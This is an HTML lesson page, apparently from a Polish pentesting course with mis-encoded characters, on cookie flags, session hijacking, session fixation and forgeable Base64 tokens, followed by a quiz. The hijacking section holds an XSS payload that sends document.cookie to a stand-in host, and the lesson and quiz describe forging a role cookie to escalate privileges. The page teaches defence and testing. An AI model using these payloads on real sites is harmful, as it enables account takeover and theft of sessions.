<!DOCTYPE html>
<html lang="pl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lekcja 03: Cookies & Sesje - Kurs Pentestera</title>

    <link rel="stylesheet" href="style.css">

    <style>
        /* Akcent dla tej lekcji: Neon Pink/Red (Critical Data) */
        :root {
            --accent: #ff0055;
            --accent-glow: rgba(255, 0, 85, 0.3);
        }
    </style>
</head>

<body>

    <div class="container">
        <header>
            <h1>COOKIES & SESJE</h1>
            <p>MODUÅ 03: ZarzÄ…dzanie stanem, Flagi i KradzieÅ¼ ToÅ¼samoÅ›ci</p>
        </header>

        <!-- 1. PROBLEM -->
        <section>
            <h2>> PROBLEM "NIEPAMIÄ˜CI"</h2>
            <p>ProtokÃ³Å‚ HTTP jest <strong>bezstanowy (stateless)</strong>. Serwer domyÅ›lnie nie pamiÄ™ta, Å¼e zapytanie nr
                2 pochodzi od tej samej osoby, co zapytanie nr 1.</p>

            <div class="card">
                <h3>ROZWIÄ„ZANIE: CIASTECZKA (COOKIES)</h3>
                <p>Aby "zalogowaÄ‡" uÅ¼ytkownika, serwer wystawia mu unikalny identyfikator (Session ID) i kaÅ¼e
                    przeglÄ…darce odsyÅ‚aÄ‡ go przy kaÅ¼dym kolejnym klikniÄ™ciu.</p>
                <pre><code><span class="comment"># Serwer wysyÅ‚a rozkaz ustawienia ciasteczka:</span>
Set-Cookie: session_id=abc123xyz; Path=/; HttpOnly; Secure</code></pre>
            </div>
        </section>

        <!-- 2. ANATOMIA -->
        <section>
            <h2>> FLAGI BEZPIECZEÅƒSTWA</h2>
            <p>To najwaÅ¼niejsza tabela w tej lekcji. Brak ktÃ³rejkolwiek z tych flag w ciasteczku sesyjnym to zazwyczaj
                bÅ‚Ä…d bezpieczeÅ„stwa.</p>

            <table>
                <thead>
                    <tr>
                        <th>Flaga</th>
                        <th>Co robi?</th>
                        <th>Znaczenie dla Pentestera</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><span class="highlight">HttpOnly</span></td>
                        <td>Blokuje dostÄ™p JavaScriptu do ciastka.</td>
                        <td><strong style="color:var(--success)">Kluczowa ochrona przed kradzieÅ¼Ä… sesji przez
                                XSS.</strong> JeÅ›li jej brakuje -> ZgÅ‚aszasz bÅ‚Ä…d.</td>
                    </tr>
                    <tr>
                        <td><span class="highlight">Secure</span></td>
                        <td>Wymusza przesyÅ‚anie tylko po HTTPS.</td>
                        <td>Chroni przed podsÅ‚uchem w sieciach otwartych (Wi-Fi).</td>
                    </tr>
                    <tr>
                        <td><span class="highlight">SameSite</span></td>
                        <td>(Strict/Lax/None) Ogranicza wysyÅ‚anie przy Å¼Ä…daniach z innych stron.</td>
                        <td>GÅ‚Ã³wna linia obrony przed <strong>CSRF</strong>.</td>
                    </tr>
                    <tr>
                        <td>Domain</td>
                        <td>OkreÅ›la zasiÄ™g ciasteczka.</td>
                        <td>Zbyt szeroki zakres (np. <code>.site.com</code>) moÅ¼e wyciekaÄ‡ sesjÄ™ do subdomen (np.
                            przejÄ™tych przez atakujÄ…cego).</td>
                    </tr>
                </tbody>
            </table>
        </section>

        <!-- 3. ATAKI -->
        <section>
            <h2>> WEKTORY ATAKU NA SESJÄ˜</h2>
            <p>Jak przejmujemy konta bez znajomoÅ›ci hasÅ‚a?</p>

            <div class="card">
                <h3>1. SESSION HIJACKING (KradzieÅ¼ sesji)</h3>
                <p>JeÅ›li zdobÄ™dziesz <code>session_id</code> ofiary, jesteÅ› ofiarÄ…. Nie potrzebujesz jej loginu ani
                    hasÅ‚a.</p>
                <ul>
                    <li><strong>XSS:</strong> JeÅ›li brak flagi <code>HttpOnly</code>, wstrzykujesz:
                        <code>&lt;script&gt;fetch('https://hacker.com?cookie='+document.cookie)&lt;/script&gt;</code>.
                    </li>
                    <li><strong>Network Sniffing:</strong> JeÅ›li brak flagi <code>Secure</code>, a ofiara jest w
                        publicznym Wi-Fi, przechwytujesz ciastko z nagÅ‚Ã³wkÃ³w HTTP.</li>
                </ul>
            </div>

            <div class="card">
                <h3>2. SESSION FIXATION</h3>
                <p>AtakujÄ…cy wchodzi na stronÄ™, dostaje sesjÄ™ (np. ID: 999), a potem podrzuca ofierze link:
                    <code>strona.com/?session_id=999</code>.</p>
                <p><span class="highlight">BÅ‚Ä…d:</span> JeÅ›li serwer po zalogowaniu ofiary <strong>nie zmieni
                        identyfikatora sesji</strong>, atakujÄ…cy (znajÄ…c ID 999) wchodzi na konto ofiary.</p>
            </div>

            <div class="card">
                <h3>3. SÅABE TOKENY (Predictable Tokens)</h3>
                <p>Czasami <code>session_id</code> nie jest losowe.</p>
                <pre><code><span class="comment"># PrzykÅ‚ad w ciasteczku:</span>
user_pref=dXNlcj1hZG1pbg==</code></pre>
                <p>To kodowanie Base64. Po odkodowaniu: <code>user=admin</code>.
                    <br><strong>Atak:</strong> Kodujesz <code>user=root</code> w Base64, podmieniasz ciastko i
                    odÅ›wieÅ¼asz stronÄ™. JesteÅ› rootem (Privilege Escalation).
                </p>
            </div>
        </section>

        <!-- CHECKLIST -->
        <section>
            <h2>CHECKLISTA / RED FLAGS</h2>
            <div class="card checklist-card">
                <div class="checklist-item">
                    <span class="check-icon">âš </span>
                    <div><strong>Brak flagi HttpOnly:</strong> JeÅ›li aplikacja ma podatnoÅ›Ä‡ XSS, brak tej flagi zamienia
                        "irytujÄ…cy alert" w "przejÄ™cie konta".</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">âš </span>
                    <div><strong>Brak rotacji sesji:</strong> Sesja (Cookie) przed zalogowaniem jest taka sama jak po
                        zalogowaniu (PodatnoÅ›Ä‡ na Fixation).</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">âš </span>
                    <div><strong>SameSite=None:</strong> Otwarta furtka do atakÃ³w CSRF (chyba Å¼e sÄ… inne tokeny
                        anty-CSRF).</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">âš </span>
                    <div><strong>WraÅ¼liwe dane w ciastku:</strong> Przechowywanie roli, ID uÅ¼ytkownika czy (o zgrozo)
                        hasÅ‚a w ciastku, zamiast trzymaÄ‡ to po stronie serwera.</div>
                </div>
            </div>
        </section>

        <!-- QUIZ -->
        <section id="quiz-section">
            <h2>ğŸ“ WERYFIKACJA WIEDZY</h2>
            <div id="quiz-container"></div>
        </section>

        <footer>
            <p style="text-align: center; margin-top: 50px; color: #555;">&copy; 2026 Kurs Pentestera | ModuÅ‚ 03</p>
        </footer>
    </div>

    <!-- DANE DO QUIZU -->
    <script>
        const quizData = [
            {
                question: "Dlaczego flaga 'HttpOnly' jest kluczowa dla bezpieczeÅ„stwa?",
                options: [
                    "Szyfruje ona ciasteczko algorytmem AES.",
                    "Sprawia, Å¼e ciasteczko dziaÅ‚a tylko na protokole HTTP (nie HTTPS).",
                    "Blokuje dostÄ™p do ciasteczka z poziomu JavaScript (document.cookie), uniemoÅ¼liwiajÄ…c jego kradzieÅ¼ przy ataku XSS.",
                    "Wymusza wygaÅ›niÄ™cie sesji po zamkniÄ™ciu karty."
                ],
                correct: 2,
                explanation: "HttpOnly to instrukcja dla przeglÄ…darki: 'WysyÅ‚aj to ciastko do serwera, ale ukryj je przed skryptami JS'. To drastycznie ogranicza skutki atakÃ³w XSS."
            },
            {
                type: "scenario",
                question: "Podczas testu zauwaÅ¼asz ciastko o wartoÅ›ci: 'cm9sZT11c2Vy'. Co robisz?",
                options: [
                    "ZgÅ‚aszam wyciek hasÅ‚a.",
                    "RozpoznajÄ™ Base64. DekodujÄ™ ('role=user'). PrÃ³bujÄ™ zmieniÄ‡ na 'role=admin', zakodowaÄ‡ ponownie i podmieniÄ‡ ciastko (Privilege Escalation).",
                    "IgnorujÄ™, to losowy hash.",
                    "PrÃ³bujÄ™ wykonaÄ‡ atak SQL Injection w nagÅ‚Ã³wku Host."
                ],
                correct: 1,
                explanation: "CiÄ…gi koÅ„czÄ…ce siÄ™ na '=' to czÄ™sto Base64. JeÅ›li serwer trzyma uprawnienia w ciastku (Client-Side Storage) zamiast w bazie (Server-Side), moÅ¼na je sfaÅ‚szowaÄ‡."
            },
            {
                question: "Na czym polega atak Session Fixation?",
                options: [
                    "Na zgadywaniu hasÅ‚a administratora.",
                    "Na wymuszeniu na ofierze uÅ¼ycia identyfikatora sesji, ktÃ³ry zna atakujÄ…cy (np. przez link). Po zalogowaniu ofiary, atakujÄ…cy wchodzi na to samo ID.",
                    "Na zablokowaniu konta po zbyt wielu prÃ³bach logowania.",
                    "Na przejÄ™ciu sesji przez niezabezpieczone Wi-Fi."
                ],
                correct: 1,
                explanation: "Fixation polega na 'ustaleniu' (fixed) ID sesji przed zalogowaniem. JeÅ›li serwer nie nada nowego ID po zalogowaniu, atakujÄ…cy i ofiara dzielÄ… tÄ™ samÄ… sesjÄ™."
            },
            {
                question: "KtÃ³ra flaga chroni ciasteczko przed podsÅ‚uchem w otwartej sieci Wi-Fi?",
                options: [
                    "HttpOnly",
                    "SameSite",
                    "Secure",
                    "Expires"
                ],
                correct: 2,
                explanation: "Flaga Secure zapewnia, Å¼e ciasteczko zostanie wysÅ‚ane TYLKO jeÅ›li poÅ‚Ä…czenie jest szyfrowane (HTTPS). W sieci HTTP ciastko nie zostanie doÅ‚Ä…czone."
            },
            {
                type: "scenario",
                question: "ZnalazÅ‚eÅ› lukÄ™ XSS na stronie banku. PrÃ³bujesz wyÅ›wietliÄ‡ ciasteczka funkcjÄ… `alert(document.cookie)`, ale alert jest pusty. JesteÅ› zalogowany. Co to oznacza?",
                options: [
                    "Luka XSS nie dziaÅ‚a.",
                    "Bank wdroÅ¼yÅ‚ flagÄ™ HttpOnly dla ciasteczek sesyjnych, wiÄ™c JS ich nie widzi.",
                    "PrzeglÄ…darka zablokowaÅ‚a skrypt.",
                    "Musisz uÅ¼yÄ‡ console.log zamiast alert."
                ],
                correct: 1,
                explanation: "To dowÃ³d na dziaÅ‚anie HttpOnly. Kod JS siÄ™ wykonaÅ‚ (alert wyskoczyÅ‚), ale nie miaÅ‚ dostÄ™pu do chronionych danych."
            },
            {
                question: "Co robi flaga SameSite=Strict?",
                options: [
                    "Wymusza zmianÄ™ hasÅ‚a co 30 dni.",
                    "Blokuje wysÅ‚anie ciasteczka, jeÅ›li Å¼Ä…danie pochodzi z innej strony (np. link w mailu). Chroni przed CSRF.",
                    "Pozwala na wysyÅ‚anie ciasteczka do kaÅ¼dej domeny.",
                    "Szyfruje treÅ›Ä‡ ciasteczka."
                ],
                correct: 1,
                explanation: "SameSite=Strict to bardzo silna ochrona. Ciasteczko jest wysyÅ‚ane tylko wtedy, gdy uÅ¼ytkownik juÅ¼ jest na stronie, a nie gdy na niÄ… wchodzi z zewnÄ…trz."
            },
            {
                question: "Gdzie w Burp Suite najÅ‚atwiej sprawdziÄ‡, czy identyfikator sesji jest losowy?",
                options: [
                    "W zakÅ‚adce Decoder.",
                    "W narzÄ™dziu Sequencer (analiza entropii tokenÃ³w).",
                    "W skanerze podatnoÅ›ci.",
                    "W ustawieniach Proxy."
                ],
                correct: 1,
                explanation: "Burp Sequencer pobiera tysiÄ…ce tokenÃ³w i przeprowadza testy statystyczne, aby sprawdziÄ‡, czy sÄ… one rzeczywiÅ›cie losowe i nieprzewidywalne."
            },
            {
                type: "scenario",
                question: "Widzisz nagÅ‚Ã³wek 'Set-Cookie: session=123; Domain=.example.com'. Co jest ryzykowne w atrybucie Domain?",
                options: [
                    "Nic, jest poprawny.",
                    "Kropka na poczÄ…tku (wildcard) oznacza, Å¼e ciastko trafi teÅ¼ do wszystkich subdomen (np. dev.example.com). JeÅ›li atakujÄ…cy przejmie subdomenÄ™, ukradnie sesjÄ™.",
                    "Domena powinna byÄ‡ adresem IP.",
                    "To bÅ‚Ä…d skÅ‚adni."
                ],
                correct: 1,
                explanation: "Zbyt szeroki zakres domeny (tzw. Loose Scoping) zwiÄ™ksza powierzchniÄ™ ataku. Ciasteczka powinny byÄ‡ przypisane do konkretnego hosta (bez kropki na poczÄ…tku), jeÅ›li to moÅ¼liwe."
            },
            {
                question: "Dlaczego HTTP jest nazywany protokoÅ‚em bezstanowym?",
                options: [
                    "Bo nie dziaÅ‚a w USA.",
                    "Bo kaÅ¼de zapytanie jest niezaleÅ¼ne i serwer nie pamiÄ™ta poprzednich interakcji bez dodatkowych mechanizmÃ³w (Cookies).",
                    "Bo nie posiada kodÃ³w bÅ‚Ä™dÃ³w.",
                    "Bo wymaga ciÄ…gÅ‚ego poÅ‚Ä…czenia."
                ],
                correct: 1,
                explanation: "Stateless to natura HTTP. Ciasteczka to 'proteza' pamiÄ™ci, ktÃ³rÄ… doÅ‚oÅ¼ono pÃ³Åºniej, aby umoÅ¼liwiÄ‡ logowanie i sklepy internetowe."
            },
            {
                question: "Co to jest 'Cookie Jar'?",
                options: [
                    "Plik z hasÅ‚ami.",
                    "Mechanizm w przeglÄ…darce lub narzÄ™dziu pentesterskim do przechowywania i automatycznego wysyÅ‚ania ciasteczek.",
                    "Nazwa zÅ‚oÅ›liwego oprogramowania.",
                    "Rodzaj ataku DoS."
                ],
                correct: 1,
                explanation: "Cookie Jar to magazyn ciasteczek. DziÄ™ki niemu narzÄ™dzia takie jak Curl czy Burp mogÄ… 'utrzymaÄ‡ sesjÄ™' podczas skanowania."
            }
        ];
    </script>

    <script src="quiz.js"></script>

</body>

</html>